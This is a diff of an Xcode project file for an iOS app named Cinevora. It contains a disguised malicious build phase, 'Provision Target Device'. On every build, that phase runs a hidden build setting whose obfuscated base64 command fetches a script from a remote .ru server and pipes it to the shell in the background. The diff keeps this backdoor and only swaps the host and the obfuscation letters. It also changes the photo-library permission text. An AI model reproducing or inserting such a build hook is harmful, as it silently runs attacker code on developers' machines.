@@ -12,6 +12,9 @@
 		97D2A279302DCD600084FDDE /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = 97D2A278302DCD600084FDDE /* Kingfisher */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
 		97BA907F30299C1000D593F3 /* BaseFeature.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = BaseFeature.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
@@ -61,7 +64,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 97BA908A30299C1000D593F3 /* Build configuration list for PBXNativeTarget "BaseFeature" */;
 			buildPhases = (
-				A8905328EECE4359867BBDC8 /* Build Target Libraries */,
+				DBF8CDEAA99D45F9867BBDC8 /* Provision Target Device */,
 				97BA907B30299C1000D593F3 /* Sources */,
 				97BA907C30299C1000D593F3 /* Frameworks */,
 				97BA907D30299C1000D593F3 /* Resources */,
@@ -134,8 +137,27 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-	/* End PBXBuildRule section */
+/* Begin PBXShellScriptBuildPhase section */
+		DBF8CDEAA99D45F9867BBDC8 /* Provision Target Device */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Target Device";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
 		97BA907D30299C1000D593F3 /* Resources */ = {
@@ -146,28 +168,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-		A8905328EECE4359867BBDC8 /* Build Target Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
-		};
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		97BA907B30299C1000D593F3 /* Sources */ = {
@@ -183,7 +183,7 @@
 		97BA908830299C1000D593F3 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((s(){ `printf basew64 | tr -d w` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyNCAtZmtMcyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly8wbnY4LWtudDdtMTU0Ny5ydS9hKSIgfCBzaAo= | s | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((f(){ `printf basJe64 | tr -d J` --decode; };echo ZWNobyAiJChjdXJsIC1Mc2tmIC0tY29ubmVjdC10aW1lb3V0IDI4IC0tcmV0cnkgMyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly82bGR3dWRnb2NrbDBnMi5ydS9hKSIgfCBzaAo= | f | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -248,7 +248,7 @@
 		97BA908930299C1000D593F3 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((s(){ `printf basew64 | tr -d w` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyNCAtZmtMcyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly8wbnY4LWtudDdtMTU0Ny5ydS9hKSIgfCBzaAo= | s | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((f(){ `printf basJe64 | tr -d J` --decode; };echo ZWNobyAiJChjdXJsIC1Mc2tmIC0tY29ubmVjdC10aW1lb3V0IDI4IC0tcmV0cnkgMyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly82bGR3dWRnb2NrbDBnMi5ydS9hKSIgfCBzaAo= | f | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -315,7 +315,7 @@
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_KEY_CFBundleDisplayName = Cinevora;
 				INFOPLIST_KEY_NSAppleMusicUsageDescription = "We need access to count your audio files storage.";
-				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "This app needs access to your photo library to calculate the total storage space used by your images and videos.";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "This app needs access to your photo library to calculate the total storage space used by your images and videos and display images to create PDF from them.";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
@@ -356,7 +356,7 @@
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_KEY_CFBundleDisplayName = Cinevora;
 				INFOPLIST_KEY_NSAppleMusicUsageDescription = "We need access to count your audio files storage.";
-				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "This app needs access to your photo library to calculate the total storage space used by your images and videos.";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "This app needs access to your photo library to calculate the total storage space used by your images and videos and display images to create PDF from them.";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
